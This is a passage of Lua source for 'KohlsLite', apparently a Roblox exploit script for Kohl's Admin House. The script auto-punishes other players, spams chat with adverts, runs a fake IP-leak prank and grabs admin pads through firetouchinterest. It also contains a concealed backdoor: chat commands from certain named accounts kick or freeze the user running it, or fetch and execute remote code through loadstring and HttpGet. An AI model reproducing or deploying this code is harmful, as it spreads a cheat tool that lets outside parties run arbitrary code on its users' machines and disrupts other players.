                                            if humanoid and humanoid.PlatformStand then
                                                Chat("unstun "..v.Name)
                                            end
                                end

                                if ALLantisetgrav == true then
                                        if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChildOfClass("BodyForce") then
                                                        Chat("respawn "..v.Name)
                                                end
                                                end
                                end

                                if ALLantiswag == true then
                                        if v.Character and v.Character:FindFirstChild("EpicCape") then
                                                Chat("normal "..v.Name)
                                        end
                                end

                        end                
                end
        end
end)

-- PLAYER CHECK
function PLAYERCHECK(plr)
  for i, v in pairs(game.Players:GetPlayers()) do
      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() then
          player = v.Name
          cplr = v
          Remind("[debug]: Found "..player)
      end
  end
end

-- Only uses for blacklisting, there is NO way I am coding it for everything
function bypassattemptcheck(plr)
                if string.sub(string.lower(plr), 1,3) == "me_" then
                        return true, "m"
                elseif string.sub(string.lower(plr), 1,4) == "all_" then
                        return true, "al"
                elseif string.sub(string.lower(plr), 1,7) == "others_" then
                        return true, "other"        
                elseif string.sub(string.lower(plr), 1,8) == "friends_" then
                        return true, "frien"
                elseif string.sub(string.lower(plr), 1,7) == "admins_" then
                        return true, "admi"
                elseif string.sub(string.lower(plr), 1,10) == "nonadmins_" then
                        return true, "nonadmi"
                elseif string.sub(string.lower(plr), 1,7) == "random_" then
                        return true, "rando"
                end
end

-- ANTI CRASH 2 (it can work better than anticrash one at times!)
game:GetService("RunService").RenderStepped:Connect(function()
        task.wait(0)
        for i, v in ipairs(game.Players:GetPlayers()) do
            if v.Backpack and v.Character then
                    if v.Backpack:FindFirstChild("VampireVanquisher") or v.Character:FindFirstChild("VampireVanquisher") then
                               if v ~= game.Players.LocalPlayer and anticrash2 == true and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
                                Chat("ungear "..v.Name)
                                Chat("punish "..v.Name)
                                Chat("h \n\n\n [KohlsLite]: Sorry, "..v.Name.. ", you cannot use the Vampire Vanquisher due to anti crash (2). \n\n\n")
                               end
                    end

                    if v.Backpack:FindFirstChild("OrinthianSwordAndShield") or v.Character:FindFirstChild("OrinthianSwordAndShield") then
                               if v ~= game.Players.LocalPlayer and anticrash2 == true and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))  then
                                Chat("ungear "..v.Name)
                                Chat("punish "..v.Name)
                                Chat("h \n\n\n [KohlsLite]: Sorry, "..v.Name.. ", you cannot use the Orinthian Sword and Shield due to anti crash (2). \n\n\n")
                               end
                    end

                if v.Backpack:FindFirstChild("DriveBloxUltimateCar") then
                               if v == game.Players.LocalPlayer and antikick2 == true then
                                game.Players.LocalPlayer.Backpack:FindFirstChild("DriveBloxUltimateCar"):Destroy()
                                Chat("ungear me")
                               end
                    end

                if v.Character:FindFirstChild("DriveBloxUltimateCar") then
                               if v == game.Players.LocalPlayer and antikick2 == true then
                                        game.Players.LocalPlayer.Character:FindFirstChild("DriveBloxUltimateCar"):Destroy()
                                        Chat("ungear me")
                               end
                    end

                if v.Backpack:FindFirstChild("BlueBucket") or v.Character:FindFirstChild("BlueBucket") then -- doesn't even kick anymore lmao
                               if v == game.Players.LocalPlayer and antikick2 == true then
                                game.Players.LocalPlayer:FindFirstChild("BlueBucket"):Destroy()
                                Chat("ungear me")
                               end
                    end

                if v.Backpack:FindFirstChild("HotPotato") or v.Character:FindFirstChild("HotPotato") then -- doesn't even kick anymore lmao
                               if v == game.Players.LocalPlayer and antikick2 == true then
                                game.Players.LocalPlayer:FindFirstChild("HotPotato"):Destroy()
                                game.Players.LocalPlayer:FindFirstChild("HotPotato"):Destroy()
                                Chat("ungear me")
                               end
                    end

                    for i, gear in pairs(v.Backpack:GetChildren()) do
                            if gear:IsA("Tool") and antigear2 == true then
                                       if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
                                        Chat("ungear "..v.Name)
                                        Chat("punish "..v.Name)
                                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use tools because of anti gear (2). \n\n\n")
                                end
                            end
                           end

                    for i, gear in pairs(v.Backpack:GetChildren()) do
                            if gear:IsA("Tool") and antitoolm == true then
                                       if v.Name == game.Players.LocalPlayer.Name then
                                        gear:Destroy()
                                end
                            end
                           end
            end
     end 
end)

-- ANTIS FOR CRASHING ATTACHING GEARBANNING AND HAVING A GEAR
local crashTools = {"OrinthianSwordAndShield", "VampireVanquisher","Emerald Knights of the Seventh Sanctum Sword and Shield"}
local attachTools = {"IvoryPeriastron"}
local nogearTools = {"PortableJustice"}
local colourTools = {"PaintBucket", "SubspaceTripmine"}
local miscTools = {"DaggerofShatteredDimensions", "SledgeHammer", "AR", "Transmorpher"}
local ninejntools = {"HyperlaserGun","Transmorpher","ConfusoRay-672"}

function warnCrash(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti crash. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti crash. \n\n\n")
                      Chat("clr") -- drop crash prevention
        end
        if autoblvgc == true and not table.find(blacklist, player.Name) then
                 table.insert(blacklist, player.Name)
        end
end

function warnGear(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName.Name .. "  because of anti gear. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName.Name .. "  because of anti gear. \n\n\n")
                      Chat("clr")
        end
end

function warnAGBan(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti gearban. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti gearban. \n\n\n")
                      Chat("clr")
        end
end

function warnAttach(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti attach. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti attach. \n\n\n")
                      Chat("clr")
        end
end

function warnPaint(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti paint. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti paint. \n\n\n")
                      Chat("clr")
        end
end

function warn9jn(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of 9jn. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of 9jn. \n\n\n")
                      Chat("clr")
        end
end

function warnMisc(player, toolName)
        local isB,spe = bypassattemptcheck(player.Name)
        if isB == true then
                       Chat("ungear " .. spe)
                       Chat("punish " .. spe)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because it's a blacklisted tool. \n\n\n")
                      Chat("clr")
        else
                Chat("ungear " .. player.Name)
                       Chat("punish " .. player.Name)
                       Chat("h \n\n\n [KohlsLite]: Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because it's a blacklisted tool. \n\n\n")
                      Chat("clr")
        end
end

function checkPlayerBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(crashTools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and anticrash then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warnCrash(player, toolName)
                   break
                end
            end
        end
    end
end

function check9jn(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(ninejntools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and antiraygun then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warn9jn(player, toolName)
                   break
                end
            end
        end
    end
end

function checkPlayerAGBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(nogearTools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and antigb then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warnAGBan(player, toolName)
                   break
                end
            end
        end
    end
end

function checkPlayerGBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(player.Backpack:GetChildren()) do
                if toolName:IsA("Tool") and antigear then
                     if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                        warnGear(player, toolName)
                        break
                     end
            end
        end
    end
end

function checkPlayerATTBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(attachTools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and antiattach2 then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warnAttach(player, toolName)
                   break
                end
            end
        end
    end
end

function checkPlayerPBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(colourTools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and antipaint then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warnPaint(player, toolName)
                   break
                end
            end
        end
    end
end

function checkPlayerMiBackpack(player)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, toolName in ipairs(miscTools) do
            local tool = backpack:FindFirstChild(toolName)
            if tool and noblt then
                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
                   warnMisc(player, toolName)
                   break
                end
            end
        end
    end
end

game.Players.PlayerAdded:Connect(function(player)
    task.wait(0)
    player.CharacterAdded:Connect(function(character)
            checkPlayerBackpack(player)
            checkPlayerGBackpack(player)
            checkPlayerAGBackpack(player)  
            checkPlayerATTBackpack(player)
            checkPlayerPBackpack(player)
            checkPlayerMiBackpack(player)
            check9jn(player)
    end)
            checkPlayerBackpack(player)
            checkPlayerGBackpack(player)
            checkPlayerAGBackpack(player)
            checkPlayerATTBackpack(player)
            checkPlayerPBackpack(player)
            checkPlayerMiBackpack(player)
            check9jn(player)
end)

game:GetService("RunService").Heartbeat:Connect(function()
    task.wait(0)
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Character then
            checkPlayerBackpack(player)
            checkPlayerGBackpack(player)
            checkPlayerAGBackpack(player)
            checkPlayerATTBackpack(player)
            checkPlayerPBackpack(player)
            checkPlayerMiBackpack(player)
            check9jn(player)
        end
    end
end)

for _, player in ipairs(game.Players:GetPlayers()) do
    task.wait(0)
    if player.Character then
            checkPlayerBackpack(player)
            checkPlayerGBackpack(player)
            checkPlayerAGBackpack(player)
            checkPlayerATTBackpack(player)
            checkPlayerPBackpack(player)
            checkPlayerMiBackpack(player)
            check9jn(player)
    end
end

-- CHAT F*CK
function ChatFudge()
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
end


-- IP LEAK REAL :O :O :O
function IPBOOM()

local number = math.random(1,255)
local number2 = math.random(1,255)
local number3 = math.random(1,255)
local number4 = math.random(1,255)
print(number.."."..number2.."."..number3.."."..number4)
Chat('h \n\n\n Everyone, check logs! \n\n\n')

for i = 1,25 do
    Chat("tp "..number.."."..number2.."."..number3.."."..number4)
end

task.wait(4)
Chat('h \n\n\n Whoops, that was the wrong thing! \n\n\n')
task.wait(4)

local coems = {}
for i, v in ipairs(game.Players:GetPlayers()) do
        table.insert(coems, v.Name)
end

local randomPlayer = "Placeholder"
choosenum = math.random(1, #coems)
randomPlayer = coems[choosenum]

Chat('h \n\n\n Hopefully '..randomPlayer..' forgives me... \n\n\n')
if randomPlayer == game.Players.LocalPlayer.Name then
   task.wait(4)
   Chat("h \n\n\n Wait a second... that's me!!!!!!! \n\n\n")
end

for i in pairs(coems) do
    table.remove(coems, i)
end
end

-- AD
function ADVERTISEMENT()
        Speak("KohlsLite is a very 'cool' KAH Script.")
        task.wait(1)
        Speak("Get it at script blox: search CMD LITE")
        task.wait(1)
        Speak("dm ts 2021x to join the kohlslite server or check the logs")
        if haspersons == true then
                Chat("m/ \n\n\n dsc gg kohlslite \n\n\n")
                Chat("h/ \n\n\n dsc gg kohlslite \n\n\n")
		Chat("ff dsc gg kohlslite")
        else
                Chat("m \n\n\n dsc gg kohlslite \n\n\n")
                Chat("h \n\n\n dsc gg kohlslite \n\n\n")
		Chat("ff dsc gg kohlslite")

        end
end

function CADVERTISEMENT()
        Speak("Join the KAH Community server today!")
        task.wait(1)
        Speak("dm ts 2021x to join the kah community server or check the logs")
        if haspersons == true then
                Chat("m/ \n\n\n dsc gg kohlslite \n\n\n")
                Chat("h/ \n\n\n dsc gg kohlslite \n\n\n")
		Chat("ff dsc gg kohlslite")

        else
                Chat("m \n\n\n dsc gg kohlslite \n\n\n")
                Chat("h \n\n\n dsc gg kohlslite \n\n\n")
		Chat("ff dsc gg kohlslite")

        end
end

-- REJOIN
function REJOIN()
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,game.Players.LocalPlayer) 
end

-- SERVERHOP delta broke this bruuigeidfi
function SERVERHOP()
        local Servers = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
        for i,v in pairs(Servers.data) do
              if v.playing ~= v.maxPlayers then
                     game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, v.id)
            end
        end    
end

-- keybinds
game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
        task.wait(0)
        if key:lower() == housekeybind then
                House()
        end
        if key:lower() == rekeybind then
                Chat("reset me")
        end        
end)

-- some antis and admin system
function PLRSTART(v)
v.Chatted:Connect(function(msg)
     task.wait(0)
     task.spawn(function()
                task.wait(0)

                if string.sub(msg:lower(), 0, 9) == "/c system" and v.Name ~= game.Players.LocalPlayer.Name then
                   if PingCsystem then
                        print(v.Name..' is using /c system.')
                        Chat("h \n\n\n [KohlsLite]: "..v.Name.." is using /c system. \n\n\n")
                   end
                end

                if string.sub(msg:lower(), 0, 2) == "/w" and v.Name ~= game.Players.LocalPlayer.Name then
                   if PingCsystem then
                        print(v.Name..' is using whispering commands.')
                        Chat("h \n\n\n [KohlsLite]: "..v.Name.." is using whispering commands. \n\n\n")
                   end
                end

                if (string.sub(msg:lower(), 0, 4) == "logs" or string.sub(msg:lower(), 0, 5) == ":logs") and v.Name ~= game.Players.LocalPlayer.Name then
                   if PingLogs then
                        print(v.Name..' is using logs.')
                        Chat("h \n\n\n [KohlsLite]: "..v.Name.." is using logs. \n\n\n")
                   end
                           if AntiLogs then
                                    LogSpam()
                           end
                end

                if (string.sub(msg:lower(), 0, 6) == "btools" or string.sub(msg:lower(), 0, 7) == ":btools" or string.sub(msg:lower(), 0, 7) == ";btools") and v.Name ~= game.Players.LocalPlayer.Name then
                        print(v.Name..' thought btools existed.')
                        Chat("h \n\n\n [KohlsLite]: "..v.Name..", btools do not exist anymore! \n\n\n")
                end

                if (string.sub(msg:lower(), 0, 3) == "sit" or string.sub(msg:lower(), 0, 4) == ":sit") and v.Name ~= game.Players.LocalPlayer.Name then
                   if antiattach then
                     Chat("reload "..v.Name)
                     print(v.Name..' tried to sit.')
                   end
                end

                if (string.sub(msg:lower(), 0, 8) == "unpunish" or string.sub(msg:lower(), 0, 9) == ":unpunish") and v.Name ~= game.Players.LocalPlayer.Name then
                   if antiattach then
                     Chat("reload "..v.Name)
                     print(v.Name..' tried to unpunish.')
                   end
                end

                if (string.sub(msg:lower(), 0, 4) == "stun" or string.sub(msg:lower(), 0, 5) == ":stun") and v.Name ~= game.Players.LocalPlayer.Name then
                   if antiattach then
                     Chat("reload "..v.Name)
                     print(v.Name..' tried to stun.')
                   end
                end

                if string.sub(msg:lower(), 0, 4) == ".fly" and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is fly me, not .fly!! \n\n\n")
                end
                end

                    if string.sub(msg:lower(), 0, 4) == ";fly" and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is fly me, not ;fly!! \n\n\n")
                end
                end

                if string.sub(msg:lower(), 0, 4) == "/fly" and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is fly me, not /fly!! \n\n\n")
                end
                end

                if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
                if noobdetect then
                   if v.Name ~= "IceStuds" and v.Name ~= "atprog" then -- very epik exception
                           print(v.Name..' is a noob.')
                           Chat("h \n\n\n [KohlsLite]: "..v.Name..", go back to FREE ADMIN, POOP IS NOT A COMMAND!! \n\n\n")
                     elseif v.Name == "IceStuds" then Chat("h \n\n\n [IceStuds]: Poop \n\n\n")
                   else Chat("h \n\n\n [atprog]: Poop \n\n\n")
                   end
                end
                end

                if string.sub(msg:lower(), 0, 6) == ";morph" or string.sub(msg:lower(), 0, 6) == ":morph" or string.sub(msg:lower(), 0, 5) == "morph" then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", go back to FREE ADMIN, MORPH IS NOT A COMMAND!! \n\n\n")
                end
                end

                if string.sub(msg:lower(), 0, 5) == ";cmds" or string.sub(msg:lower(), 0, 9) == ";commands" then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", imagine using the ; prefix! You do not need any!! \n\n\n")
                end
                end

                if string.sub(msg:lower(), 0, 5) == "/cmds" or string.sub(msg:lower(), 0, 9) == "/commands" then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", imagine using the / prefix! You do not need any!! \n\n\n")
                end
                end

                if (string.sub(msg:lower(), 0, 5) == ".cmds" or string.sub(msg:lower(), 0, 9) == ".commands") and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", imagine using the . prefix! You do not need any!! \n\n\n")
                end
                end

                if string.sub(msg:lower(), 0, 7) == ";fly me" then
                if noobdetect then
                   print(v.Name..' is a noob.') 
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", imagine using the ; prefix! You do not need any!! \n\n\n")
                end
                end

                if (string.sub(msg:lower(), 0, 6) == ";bring" or string.sub(msg:lower(), 0, 6) == ":bring" or string.sub(msg:lower(), 0, 5) == "bring" or string.sub(msg:lower(), 0, 6) == ".bring") and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is tp (plr) me, not ;bring!! \n\n\n")
                end
                end

                if (string.sub(msg:lower(), 0, 5) == ";goto" or string.sub(msg:lower(), 0, 5) == ":goto" or string.sub(msg:lower(), 0, 4) == "goto" or string.sub(msg:lower(), 0, 5) == ".goto") and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.') 
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is tp me (plr), not ;goto!! \n\n\n")
                    end
                end

                    if (string.sub(msg:lower(), 0, 6) == ";sword" or string.sub(msg:lower(), 0, 6) == ".sword") and v.Name ~= game.Players.LocalPlayer.Name then
                if noobdetect then
                   print(v.Name..' is a noob.')
                   Chat("h \n\n\n [KohlsLite]: "..v.Name..", it is sword me, not ;sword!! \n\n\n")
                end
                end

                -- // dev \\ --

                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                Speak("[KohlsLite]: I use KohlsLite!")
                end

                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
				    if not table.find(nokick,game.Players.LocalPlayer.Name) then
           			    Speak("[KohlsLite]: I use KohlsLite!")
				    end
                end  

                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
                                 Speak("[PR Script]: atprog is my daddy fr!")
                end

                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                pcall(function()
                                        game.Players.LocalPlayer:Kick("[KohlsLite]: SkiddingProgrammer {kohlslite owner} kicked you from the game!")
                                end)
                end  

                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(nokick,game.Players.LocalPlayer.Name) then
                                pcall(function()
                                        game.Players.LocalPlayer:Kick("[KohlsLite]: You were kicked by a KohlsLite admin!")
                                end)
                        end
                end  

                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
                                        game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
                end  

                       if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                    Remind("[KohlsLite]: You have been warned!")
                end

                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                Remind("[PR Script]: You have been warned!")
                end

                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
                                     while true do end
                                -- game:Shutdown()
                end
                
                if string.sub(msg:lower(), 0, 6) == "-admin" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
                                     game.Players:Chat(".admin atprog")
                                     game.Players:Chat(".saveadmin atprog")
                                     game.Players:Chat(".saveadmin icestuds")
                                     game.Players:Chat(".admin icestuds")
                end

                if string.sub(msg:lower(), 0, 11) == "-admingiver" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
                loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/prisonlife/main/admingiver"))()
                end

                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                     while true do end
                                -- game:Shutdown()
                end

                if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                 Speak("Spamming like how I spammed little kids")
                end

                if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
                        if not table.find(nokick,game.Players.LocalPlayer.Name) then
                                Speak("Spamming like how I spammed little kids")
                        end
                end

                end)

if string.sub(msg:lower(), 0, 4) == "-hrc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "dawninja21alt" or v.Name == "darkmadeboy") then
                                Speak("[Hydra.lua]: Hydra.lua on top!")
                end

                if string.sub(msg:lower(), 0, 4) == "-hrk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "dawninja21" then
                                        game.Players.LocalPlayer:Kick("[Hydra.lua]: DarkSpecies has kicked you from the game.")
end
-- ADMIN
            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
                    local command = string.gsub(msg:lower(), "me", v.Name)
                    if string.sub(command, 1, 1) == ":" then
                               command = ""
                               Chat("pm "..v.Name.." [KohlsLite]: Please use commands without : - Thanks!")
                    end

                    if string.sub(command, 1, 1) == "/" then -- because /e dance
                               command = ""
                    end

                if string.sub(command, 1, 1) == prefix then -- so THEY don't use YOU!
                       command = ""
                end

            if string.sub(command, 1, 5) == "music" then
               local MUSIC = string.sub(command, 7)
               Chat("music "..MUSIC)

            elseif string.sub(command, 1, 2) == "m " then
               local message = string.sub(command, 3)
               Chat('m '..v.Name..': '..message)

            elseif string.sub(command, 1, 7) == "size me" then
               local NUMBER = string.sub(command, 9)
               Chat("size "..v.Name.." "..NUMBER)

            elseif string.sub(command, 1, 12) == "jumppower me" then
               local JPP = string.sub(command, 14)
               Chat("jumppower "..v.Name.." "..JPP)

            elseif string.sub(command, 1, 7) == "name me" then
               local NAME = string.sub(command, 9)
               Chat("name "..v.Name.." "..NAME)

            elseif string.sub(command, 1, 7) == "message" then
               local message = string.sub(command, 9)
               Chat('message '..v.Name..': '..message)

            elseif string.sub(command, 1, 3) == "pm " then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you private message because of limitations. Sorry!")

            elseif string.sub(command, 1, 5) == "hint " then
               local message = string.sub(command, 6)
               Chat('h '..v.Name..': '..message)

            elseif string.sub(command, 1, 2) == "h " then
               local message = string.sub(command, 3)
               Chat('h '..v.Name..': '..message)

            elseif string.sub(command, 1, 4) == "logs" then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you see logs because it's client sided. Sorry!")

            elseif string.sub(command, 1, 4) == "cmds" then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you see commands because it's client sided. Sorry!")

            elseif string.sub(command, 1, 8) == "commands" then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you see commands because it's client sided. Sorry!")

            elseif string.sub(command, 1, 9) == "musiclist" then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you see the music list because it's client sided. Sorry!")

            elseif string.sub(command, 1, 11) == "packagelist" then
               Chat("pm "..v.Name.." [KohlsLite]: I can't make you see the package list because it's client sided. Sorry!")

            else
               Chat(command)
            end
          end


    end)

end


-- Backpack checker
function CheckBackpack()
        Remind("Check console by running /console!")
        print(player.." has the following items:")
              for _, Tool in pairs(cplr.Backpack:GetChildren()) do
                print(Tool.Name)
        end
end


-- LOOPGRAB 1 (broken)
task.spawn(function()
    while true do 
        task.wait(0)
            coroutine.wrap(function() -- PadAbuse
                        if loopgrab == true and firetouchinterest then
                                local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                                for i, pad in pairs(pads) do
                                        coroutine.wrap(function()
                                                pcall(function()
                                                        local cre = pad.Head
                                                        local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                                                        firetouchinterest(cre, spr, 1)
                                                            firetouchinterest(cre, spr, 0)
                                                            firetouchinterest(cre, spr, 1)
                                                        task.wait()
                                                        firetouchinterest(cre, spr, 0)

                                                        if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                                                                Regen()
                                                        end
                                                end)
                                        end)()
                                end
                        end
        end)()
    end
end)

-- loopgrab 2
